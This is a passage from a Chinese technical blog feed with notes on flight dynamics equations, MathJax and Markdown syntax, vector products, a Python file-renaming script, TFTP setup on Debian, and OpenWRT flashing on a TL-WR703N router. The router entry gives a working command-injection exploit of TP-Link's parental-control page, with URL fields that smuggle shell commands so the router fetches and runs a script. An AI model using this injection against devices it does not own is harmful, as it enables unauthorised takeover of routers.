href="#一般动坐标系中绕质心转动动力学方程" class="headerlink" title="一般动坐标系中绕质心转动动力学方程"></a>一般动坐标系中绕质心转动动力学方程</h2><p>具体研究飞行器绕质心转动规律时，矢量形式的式$(6)$使用不便。工程习惯上将其投影在一动坐标系上建成方程的标量形式。此时动坐标系在空中以$w$转动，类同于加速度$\frac{dV}{dt}$，动量矩可以表示为：</p><script type="math/tex; mode=display">M=\frac{dh}{dt}=\frac{\delta h}{\delta t}+w\times h</script><p>类似一般动坐标系中质心动力学方程的推导，最终可得转动运动方程的标量形式为：</p><script type="math/tex; mode=display">m(\frac{dh_x}{dt}+h_zw_y-h_yw_z)=F_x</script><script type="math/tex; mode=display">m(\frac{dh_y}{dt}+h_xw_z-h_zw_x)=F_y</script><script type="math/tex; mode=display">m(\frac{dh_z}{dt}+h_yw_x-h_xw_y)=F_z</script><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol><li>方振平,陈万春,张曙光. 航空飞行器飞行动力学[M]. 2015.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在飞行仿真中，获取飞机的位姿是基本要求。将飞行器视为刚体，根据牛顿第二定律和动量矩定理，即可推导出飞机的质心运动方程和飞机绕质心转动的动力学方程，即刚体的六自由度方程。下面即从《航空飞行器飞行动力学》中摘抄刚体六自由度方程的推导过程。&lt;/p&gt;
&lt;h1 id=&quot;飞行器质心运动
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="3D" scheme="https://huangwang.github.io/tags/3D/"/>
    
      <category term="飞行力学" scheme="https://huangwang.github.io/tags/%E9%A3%9E%E8%A1%8C%E5%8A%9B%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>MathJax语法笔记</title>
    <link href="https://huangwang.github.io/2019/01/05/MathJax%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
    <id>https://huangwang.github.io/2019/01/05/MathJax语法笔记/</id>
    <published>2019-01-05T10:05:32.000Z</published>
    <updated>2019-01-26T08:00:26.876Z</updated>
    
    <content type="html"><![CDATA[<p>MathJax是一个跨浏览器的JavaScript库，它使用MathML、LaTeX和ASCIIMathML标记在Web浏览器中显示数学符号。MathJax是在Apache许可证下作为开源软件发布的。</p><h1 id="安装MathJax"><a href="#安装MathJax" class="headerlink" title="安装MathJax"></a>安装MathJax</h1><p>MathJax有三种安装方式：最简单的方法就是使用分布式网络服务中的MathJax的副本，它位于 cdn.mathjax.org ,但是你也可以下载并安装一个MathJax的副本到你的服务器,或者使用在你本地硬盘的副本（这样是不需要使用网络）。 官方文档里有详细的描述。</p><h1 id="MathJax语法"><a href="#MathJax语法" class="headerlink" title="MathJax语法"></a>MathJax语法</h1><h2 id="如何插入公式"><a href="#如何插入公式" class="headerlink" title="如何插入公式"></a>如何插入公式</h2><p>LaTeX的数学公式有两种：行中公式和独立公式。行中公式放在文中与其它文字混编，独立公式单独成行。</p><p>行中公式可以用如下两种方法表示：</p><blockquote><p>(数学公式)　或　$数学公式$</p></blockquote><p>独立公式可以用如下两种方法表示：</p><blockquote><p>[数学公式]　或　$$数学公式$$</p></blockquote><h2 id="打Tag和引用公式"><a href="#打Tag和引用公式" class="headerlink" title="打Tag和引用公式"></a>打Tag和引用公式</h2><p>如果在某个公式之后，又想要引用原公式并说明原公式的出处，可以用 tagging/labelling/referencing system来做。 </p><p>可以用 \tag{yourtag} 来给原公式打 Tag。</p><script type="math/tex; mode=display">m\frac{dV}{dt}=F \tag{1}</script><p>如果在后面需要引用它，就在 \tag 后面加上 \label{somelabel}，yourtag 和 somelabel不一定要一样，但最好一样。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://zh.wikipedia.org/wiki/MathJax" target="_blank" rel="noopener">MathJax</a>, by wikipedia.</li><li><a href="https://www.zybuluo.com/knight/note/96093" target="_blank" rel="noopener">MathJax使用LaTeX语法编写数学公式教程</a>, by knight.</li><li><a href="https://www.mathjax.org/" target="_blank" rel="noopener">MathJax Home</a>, by mathjax.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;MathJax是一个跨浏览器的JavaScript库，它使用MathML、LaTeX和ASCIIMathML标记在Web浏览器中显示数学符号。MathJax是在Apache许可证下作为开源软件发布的。&lt;/p&gt;
&lt;h1 id=&quot;安装MathJax&quot;&gt;&lt;a href=&quot;#安装M
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="语法" scheme="https://huangwang.github.io/tags/%E8%AF%AD%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Markdown语法笔记</title>
    <link href="https://huangwang.github.io/2019/01/05/Markdown%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
    <id>https://huangwang.github.io/2019/01/05/Markdown语法笔记/</id>
    <published>2019-01-05T10:04:18.000Z</published>
    <updated>2019-01-05T11:55:32.993Z</updated>
    
    <content type="html"><![CDATA[<p>一直使用Markdown编辑文档，偶尔会遇到使用一些特殊Markdown语法，为了防止遗忘，特在此记录一下。</p><h1 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h1><p>在Markdown中，可以使用 * 和  _  表示斜体，用 ** 表示加粗。例如：</p><p><em>Coding，让开发更简单</em></p><p><em>Coding，让开发更简单</em></p><p><strong>Coding，让开发更简单</strong></p><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>Markdown 标记区块引用和 email 中用 『&gt;』的引用方式类似，只需要在整个段落的第一行最前面加上 『&gt;』 ：</p><blockquote><p>Coding.net 为软件开发者提供基于云计算技术的软件开发平台，包括项目管理，代码托管，运行空间和质量控制等等。</p></blockquote><p>区块引用可以嵌套，只要根据层次加上不同数量的『&gt;』：</p><blockquote><p>这是第一级引用。</p><blockquote><p>这是第二级引用。</p></blockquote><p>现在回到第一级引用。</p></blockquote><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://coding.net/help/doc/project/markdown.html#i-6" target="_blank" rel="noopener">Markdown 语法介绍</a>, by coding.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一直使用Markdown编辑文档，偶尔会遇到使用一些特殊Markdown语法，为了防止遗忘，特在此记录一下。&lt;/p&gt;
&lt;h1 id=&quot;强调&quot;&gt;&lt;a href=&quot;#强调&quot; class=&quot;headerlink&quot; title=&quot;强调&quot;&gt;&lt;/a&gt;强调&lt;/h1&gt;&lt;p&gt;在Markdow
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="语法" scheme="https://huangwang.github.io/tags/%E8%AF%AD%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>向量点积叉积及其几何意义</title>
    <link href="https://huangwang.github.io/2019/01/05/%E5%90%91%E9%87%8F%E7%82%B9%E7%A7%AF%E5%8F%89%E7%A7%AF%E5%8F%8A%E5%85%B6%E5%87%A0%E4%BD%95%E6%84%8F%E4%B9%89/"/>
    <id>https://huangwang.github.io/2019/01/05/向量点积叉积及其几何意义/</id>
    <published>2019-01-05T09:54:05.000Z</published>
    <updated>2019-01-05T12:36:39.236Z</updated>
    
    <content type="html"><![CDATA[<p>在3D游戏开发中，经常用到向量的点积和叉积及其几何意义，为防止遗忘，在此记录一下。</p><h1 id="点积"><a href="#点积" class="headerlink" title="点积"></a>点积</h1><p>在数学中，<strong>点积</strong>（德语：Skalarprodukt、英语：Dot Product）又称数量积或标量积（德语：Skalarprodukt、英语：Scalar Product），是一种接受两个等长的数字序列（通常是坐标向量）、返回单个数字的代数运算。在欧几里得几何中，两个笛卡尔坐标向量的点积常称为内积（德语：inneres Produkt、英语：Inner Product），见内积空间。</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>点积有两种定义方式：代数方式和几何方式。通过在欧氏空间中引入笛卡尔坐标系，向量之间的点积既可以由向量坐标的代数运算得出，也可以通过引入两个向量的长度和角度等几何概念来求解。</p><h3 id="代数定义"><a href="#代数定义" class="headerlink" title="代数定义"></a>代数定义</h3><p>两个向量  $\vec{a} = [a1, a2,…, an]$和  $\vec{b} = [b1, b2,…, bn]$的点积定义为：</p><script type="math/tex; mode=display">\vec{a}\cdot \vec{b} = \sum_{i=1}^n a_ib_i = a_1b_1 + a_2b_2 + \cdots + a_nb_n</script><p>这里的Σ是求和符号，而n是向量空间的维数。</p><h3 id="几何定义"><a href="#几何定义" class="headerlink" title="几何定义"></a>几何定义</h3><p>在欧几里得空间中，点积可以直观地定义为</p><script type="math/tex; mode=display">\vec{a} \cdot \vec{b} = |\vec{a}| \, |\vec{b}| \cos \theta \;</script><p>这里 $|\vec{x}|$ 表示 $\vec{x}$的模（长度）， $\theta$ 表示两个向量之间的角度。</p><h1 id="叉积"><a href="#叉积" class="headerlink" title="叉积"></a>叉积</h1><p>在数学和向量代数领域，叉积（英语：Cross product）又称向量积（英语：Vector product），是对三维空间中的两个向量的二元运算，使用符号 $\times$。与点积不同，它的运算结果是向量。对于线性无关的两个向量 $\mathbf {a}$  和 $\mathbf {b}$ ，它们的叉积写作 ${\mathbf {a} \times \mathbf {b} }$，是 $\mathbf {a}$  和 $\mathbf {b}$ 所在平面的法线向量，与 $\mathbf {a}$ 和 $\mathbf {b}$ 都垂直。叉积被广泛运用于数学、物理、工程学、计算机科学领域。</p><h2 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h2><p>两个向量  $\mathbf {a}$  和  $\mathbf {b}$  的叉积仅在三维空间中有定义，写作  ${\displaystyle \mathbf {a} \times \mathbf {b} }$。在物理学中，叉积有时也被写成${\displaystyle \mathbf {a} \wedge \mathbf {b} }$，但在数学中 ${\displaystyle \mathbf {a} \wedge \mathbf {b} }$ 是外代数中的外积。</p><p>叉积 ${\displaystyle \mathbf {a} \times \mathbf {b} }$ 是与  $\mathbf {a}$  和  $\mathbf {b}$  都垂直的向量 $\mathbf {c}$ 。其方向由右手定则决定，模长等于以两个向量为边的平行四边形的面积。</p><p align="center">    <img src="images/Right_hand_rule_cross_product.png" width="60%" alt="右手定则"></p><p>叉积可以定义为：</p><script type="math/tex; mode=display">{\displaystyle \mathbf {a} \times \mathbf {b} =\|\mathbf {a} \|\|\mathbf {b} \|\sin(\theta )\ \mathbf {n} }</script><p>其中$\theta$  表示  $\mathbf {a}$  和  $\mathbf {b}$  在它们所定义的平面上的夹角（ ${\displaystyle 0^{\circ }\leq \theta \leq 180^{\circ }}$）。  ${\displaystyle |\mathbf {a} |}$ 和  ${\displaystyle |\mathbf {b} |}$ 是向量$\mathbf {a}$  和  $\mathbf {b}$  的模长，而  $\mathbf{n}$ 则是一个与  $\mathbf {a}$ 、 $\mathbf {b}$  所构成的平面垂直的单位向量，方向由右手定则决定。根据上述公式，当$\mathbf {a}$  与 $\mathbf {b}$  平行（即 $\theta$  为 0° 或 180°）时，它们的叉积为零向量  $\mathbf{0}$。</p><p align="center">    <img src="images/Cross_product_vector.png" width="60%" alt="在右手坐标系中的向量积"></p><h2 id="矩阵表示"><a href="#矩阵表示" class="headerlink" title="矩阵表示"></a>矩阵表示</h2><p>叉积可以表达为这样的行列式：</p><script type="math/tex; mode=display">{\displaystyle \mathbf {u\times v} ={\begin{vmatrix}\mathbf {i} &\mathbf {j} &\mathbf {k} \\u_{1}&u_{2}&u_{3}\\v_{1}&v_{2}&v_{3}\\\end{vmatrix}}}</script><p>这个行列式可以使用萨吕法则或拉普拉斯展开计算。使用拉普拉斯展开可以沿第一行展开为：</p><script type="math/tex; mode=display">{\displaystyle {\begin{aligned}\mathbf {u\times v} &={\begin{vmatrix}u_{2}&u_{3}\\v_{2}&v_{3}\end{vmatrix}}\mathbf {i} -{\begin{vmatrix}u_{1}&u_{3}\\v_{1}&v_{3}\end{vmatrix}}\mathbf {j} +{\begin{vmatrix}u_{1}&u_{2}\\v_{1}&v_{2}\end{vmatrix}}\mathbf {k} \\&=(u_{2}v_{3}-u_{3}v_{2})\mathbf {i} -(u_{1}v_{3}-u_{3}v_{1})\mathbf {j} +(u_{1}v_{2}-u_{2}v_{1})\mathbf {k} \end{aligned}}}</script><p>可以直接得到结果向量。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://zh.wikipedia.org/wiki/叉积" target="_blank" rel="noopener">叉积</a>, by wikipedia.</li><li><a href="https://zh.wikipedia.org/wiki/点积" target="_blank" rel="noopener">数量积</a>, by wikipedia.</li><li><a href="https://blog.csdn.net/dcrmg/article/details/52416832" target="_blank" rel="noopener">向量点乘（内积）和叉乘（外积、向量积）概念及几何意义解读</a>, by -牧野-.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在3D游戏开发中，经常用到向量的点积和叉积及其几何意义，为防止遗忘，在此记录一下。&lt;/p&gt;
&lt;h1 id=&quot;点积&quot;&gt;&lt;a href=&quot;#点积&quot; class=&quot;headerlink&quot; title=&quot;点积&quot;&gt;&lt;/a&gt;点积&lt;/h1&gt;&lt;p&gt;在数学中，&lt;strong&gt;点积&lt;/stro
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="3D" scheme="https://huangwang.github.io/tags/3D/"/>
    
  </entry>
  
  <entry>
    <title>Python批量重命名文件</title>
    <link href="https://huangwang.github.io/2019/01/01/Python%E6%89%B9%E9%87%8F%E9%87%8D%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6/"/>
    <id>https://huangwang.github.io/2019/01/01/Python批量重命名文件/</id>
    <published>2019-01-01T14:41:12.000Z</published>
    <updated>2019-01-05T11:53:52.221Z</updated>
    
    <content type="html"><![CDATA[<p>最近从iData中下载了很多学术论文，这些论文文件名都以“www.cn-ki.net_”开头，一个个重命名太麻烦，于是使用如下python3脚本批量重命名文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># Python3 code to rename multiple  </span><br><span class="line"># files in a directory or folder </span><br><span class="line">  </span><br><span class="line"># importing os module </span><br><span class="line">import os </span><br><span class="line">  </span><br><span class="line"># Function to rename multiple files </span><br><span class="line">def main(): </span><br><span class="line"></span><br><span class="line">    # search file in current directory  </span><br><span class="line">    for filename in os.listdir(&quot;.&quot;): </span><br><span class="line"></span><br><span class="line">        if os.path.isfile(filename):</span><br><span class="line">            if &quot;www.cn-ki.net_&quot; in filename[0:14]:</span><br><span class="line">                src=filename</span><br><span class="line">                dst=filename[14:]</span><br><span class="line">                # rename the special file</span><br><span class="line">                os.rename(src, dst)</span><br><span class="line">  </span><br><span class="line"># Driver Code </span><br><span class="line">if __name__ == &apos;__main__&apos;: </span><br><span class="line">      </span><br><span class="line">    # Calling main() function </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近从iData中下载了很多学术论文，这些论文文件名都以“www.cn-ki.net_”开头，一个个重命名太麻烦，于是使用如下python3脚本批量重命名文件。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="python" scheme="https://huangwang.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>TL-WR703N版本v1.7刷openwrt教程</title>
    <link href="https://huangwang.github.io/2018/12/31/TL-WR703N%E7%89%88%E6%9C%ACv1-7%E5%88%B7openwrt%E6%95%99%E7%A8%8B/"/>
    <id>https://huangwang.github.io/2018/12/31/TL-WR703N版本v1-7刷openwrt教程/</id>
    <published>2018-12-31T03:49:39.000Z</published>
    <updated>2018-12-31T05:15:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>我的TL-WR703N路由器运行不稳定，就准备尝试刷最新的OpenWRT，看看能否好一点。</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ul><li><p>一个 TP-Link TL-WR703N 路由器，确保固件版本为 3.17.1 Build 140120 Rel.56593n</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 在刷机之前，按reset按钮重置路由器</span><br></pre></td></tr></table></figure></li><li><p>TL-WR703N 的 openwrt 固件 openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 下载openwrt固件并拆分成两份（因为wr703n的内存很小，可能传输的时候传不了整个文件）</span><br><span class="line">curl https://downloads.openwrt.org/snapshots/trunk/ar71xx/generic/openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin -o openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin</span><br><span class="line">dd if=openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of=i1 bs=1 count=1048576</span><br><span class="line">dd if=openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of=i2 bs=1 skip=1048576</span><br></pre></td></tr></table></figure></li><li><p>TFTP 服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 安装TFTP的客户端和服务器端</span><br><span class="line">sudo apt-get install atftp atftpd</span><br></pre></td></tr></table></figure></li><li><p>busybox 1.16.1 MIPS 版</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://busybox.net/downloads/binaries/1.21.1/busybox-mips &gt; busybox</span><br></pre></td></tr></table></figure></li><li><p>编写Hack脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">tftp -gl i1 192.168.1.100 # 把i1从tftp服务器下载下来，这里的ip应该是，你的tftp服务器连接路由器之后，ifconfig看到的ip</span><br><span class="line">tftp -gl i2 192.168.1.100 # 把i2从tftp服务器下载下来</span><br><span class="line">tftp -gl busybox 192.168.1.100 # 把busybox从tftp服务器下载下来</span><br><span class="line">chmod 755 busybox  # 修改busybox权限以执行命令</span><br><span class="line">./busybox dd if=i1 of=/dev/mtdblock1 conv=fsync # 将i1写入磁盘分区</span><br><span class="line">./busybox dd if=i2 of=/dev/mtdblock2 conv=fsync # 将i2写入磁盘分区</span><br><span class="line">reboot -f # 重启，会启动openwrt</span><br></pre></td></tr></table></figure></li></ul><h1 id="刷机流程"><a href="#刷机流程" class="headerlink" title="刷机流程"></a>刷机流程</h1><p>在V1.7以前，可以通过路由器的Web UI直接将openwrt刷到板子上，但在V1.7之后，只能通过利用TP-LINK家长控制的漏洞，让路由板执行一些代码，成功刷写openwrt系统。本教程就是利用TP-LINK家长控制的漏洞进行openwrt刷机。下面介绍openwrt刷机的步骤。</p><h2 id="搭建tftp服务器"><a href="#搭建tftp服务器" class="headerlink" title="搭建tftp服务器"></a>搭建tftp服务器</h2><p>在Debian操作系统中搭建tftp服务器请参考链接4。将busybox、 拆开的固件i1和i2、Hack脚本aa放入tftp服务器目录。</p><h2 id="Hack-into-TL-WR703N"><a href="#Hack-into-TL-WR703N" class="headerlink" title="Hack into TL-WR703N"></a>Hack into TL-WR703N</h2><p>这个方法是利用TPLINK家长控制漏洞，以curl的方式执行命令，让路由器从tftp服务器上下载脚本，执行命令，从而将openwrt固件写入路由器。</p><blockquote><p>【警告】以下步骤可能导致你的路由器变砖，请确认当前的路由器固件版本是3.17.1 Build 140120. 下述全过程请勿断开连接或是断开电源，本人不对产生的任何后果负责！另外，每一步都很重要，别忽略其中任何一步。一旦变砖，请用3.3V的串口线抢救。</p></blockquote><p>步骤如下：</p><ul><li><p>长按reboot按钮将路由器恢复出厂设置</p></li><li><p>将tftp服务器通过WiFi的方式连接到路由器 TL-WR703N，ifconfig记住tftp服务器的ip，我的是192.168.1.100</p></li><li><p>在tftp服务器上执行如下命令修改路由器WebUI默认管理员密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 此处修改密码为admin42，注意Cookies中认证变量Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D即是设置管理员密码为admin42。后续将继续使用该变量进行其他操作，如果认证变量不正确，操作将无法执行。</span><br><span class="line">curl -o - -b &apos;tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=true&apos; &apos;http://192.168.1.1/&apos;</span><br></pre></td></tr></table></figure></li><li><p>启用家长控制（利用漏洞）</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o - -b &apos;tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=&apos; --referer &apos;http://192.168.1.1/userRpm/ParentCtrlRpm.htm&apos; &apos;http://192.168.1.1/userRpm/ParentCtrlRpm.htm?ctrl_enable=1&amp;parent_mac_addr=00-00-00-00-00-02&amp;Page=1&apos;</span><br></pre></td></tr></table></figure><ul><li>让路由器从tftp服务器下载并执行脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 执行下述命令后，等待大约三分钟，路由器会重启进入openwrt系统，状态灯会闪烁一会儿</span><br><span class="line">curl -o - -b &apos;tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=&apos; --referer &apos;http://192.168.1.1/userRpm/ParentCtrlRpm.htm?Modify=0&amp;Page=1&apos; &apos;http://192.168.1.1/userRpm/ParentCtrlRpm.htm?child_mac=00-00-00-00-00-01&amp;lan_lists=888&amp;url_comment=test&amp;url_0=;cd%20/tmp;&amp;url_1=;tftp%20-gl%20aa%20192.168.1.100;&amp;url_2=;sh%20aa;&amp;url_3=&amp;url_4=&amp;url_5=&amp;url_6=&amp;url_7=&amp;scheds_lists=255&amp;enable=1&amp;Changed=1&amp;SelIndex=0&amp;Page=1&amp;rule_mode=0&amp;Save=%B1%A3+%B4%E6&apos;</span><br></pre></td></tr></table></figure></li></ul><h1 id="openwrt系统配置"><a href="#openwrt系统配置" class="headerlink" title="openwrt系统配置"></a>openwrt系统配置</h1><p>openwrt默认使用LuCI 用户界面，具体配置方法暂时没有时间研究。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://cubicpill.me/2018/03/17/wr703n-openwrt.html" target="_blank" rel="noopener">给 v1.7 版本的 TL-WR703N 刷 openwrt</a>,by Cubic Zone.</li><li><a href="https://juejin.im/entry/5a2f92df6fb9a0450d110c14" target="_blank" rel="noopener">TL-WR703N v1.7刷openwrt</a>,by 梦里茶.</li><li><a href="https://openwrt.org/toh/tp-link/tl-wr703n" target="_blank" rel="noopener">TP-Link TL-WR703N</a>,by openwrt.</li><li><a href="https://huangwang.github.io/2018/12/30/Debian安装配置使用TFTP/">Debian安装配置使用TFTP</a>,by jack huang.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我的TL-WR703N路由器运行不稳定，就准备尝试刷最新的OpenWRT，看看能否好一点。&lt;/p&gt;
&lt;h1 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="计算机网络" scheme="https://huangwang.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>Debian安装配置使用TFTP</title>
    <link href="https://huangwang.github.io/2018/12/30/Debian%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8TFTP/"/>
    <id>https://huangwang.github.io/2018/12/30/Debian安装配置使用TFTP/</id>
    <published>2018-12-30T12:50:23.000Z</published>
    <updated>2018-12-30T13:30:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>简单文件传输协议也称小型文件传输协议（Trivial File Transfer Protocol, TFTP），是一种简化的文件传输协议（FTP），通过少量存储器就能轻松实现。</p><h1 id="TFTP技术信息"><a href="#TFTP技术信息" class="headerlink" title="TFTP技术信息"></a>TFTP技术信息</h1><p>小型文件传输协议的一些详细资料：</p><ul><li>使用UDP（端口69）作为其传输协议（不像FTP使用TCP端口21）。</li><li>不能列出目录内容。</li><li>无验证或加密机制。</li><li>被用于在远程服务器上读取或写入文件。</li><li>支持三种不同的传输模式：”netascii”,”octet”和”mail”，前两种匹配FTP协议中的”ASCII”和”image（binary）”模式；第三种从来很少使用，当前已经废弃。</li></ul><h1 id="TFTP安装"><a href="#TFTP安装" class="headerlink" title="TFTP安装"></a>TFTP安装</h1><p>安装TFTP的客户端和服务器端：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install atftp atftpd</span><br></pre></td></tr></table></figure></p><h1 id="TFTP配置"><a href="#TFTP配置" class="headerlink" title="TFTP配置"></a>TFTP配置</h1><ol><li>创建TFTP服务器目录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /tftpboot</span><br><span class="line">sudo chmod 777 /tftpboot</span><br><span class="line">sudo chmod 777 /tftpboot/*</span><br></pre></td></tr></table></figure><ol><li>编辑TFTP配置文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/default/atftpd</span><br><span class="line"></span><br><span class="line"># 修改内容如下，主要是修改目录</span><br><span class="line">USE_INETD=false</span><br><span class="line">OPTIONS=&quot;--daemon --port 69 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /tftpboot&quot;</span><br></pre></td></tr></table></figure><ol><li>重启TFTP守护程序</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/atftpd restart</span><br></pre></td></tr></table></figure><h1 id="TFTP测试"><a href="#TFTP测试" class="headerlink" title="TFTP测试"></a>TFTP测试</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~$ sudo tftp 192.168.43.116</span><br><span class="line">tftp&gt; status</span><br><span class="line">Connected to 192.168.43.116.</span><br><span class="line">Mode: netascii Verbose: off Tracing: off</span><br><span class="line">Rexmt-interval: 5 seconds, Max-timeout: 25 seconds</span><br><span class="line">tftp&gt; get iproad.txt</span><br><span class="line">Received 959 bytes in 0.0 seconds</span><br><span class="line">tftp&gt; put upload.txt</span><br><span class="line">Sent 13 bytes in 0.0 seconds</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://zh.wikipedia.org/wiki/小型文件传输协议" target="_blank" rel="noopener">TFTP</a>,by wikipedia.</li><li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-using-tftp-install-malicious-software-target-0157547/" target="_blank" rel="noopener">Using TFTP to Install Malicious Software on the Target</a>,by kail forum.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简单文件传输协议也称小型文件传输协议（Trivial File Transfer Protocol, TFTP），是一种简化的文件传输协议（FTP），通过少量存储器就能轻松实现。&lt;/p&gt;
&lt;h1 id=&quot;TFTP技术信息&quot;&gt;&lt;a href=&quot;#TFTP技术信息&quot; class
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="Linux" scheme="https://huangwang.github.io/tags/Linux/"/>
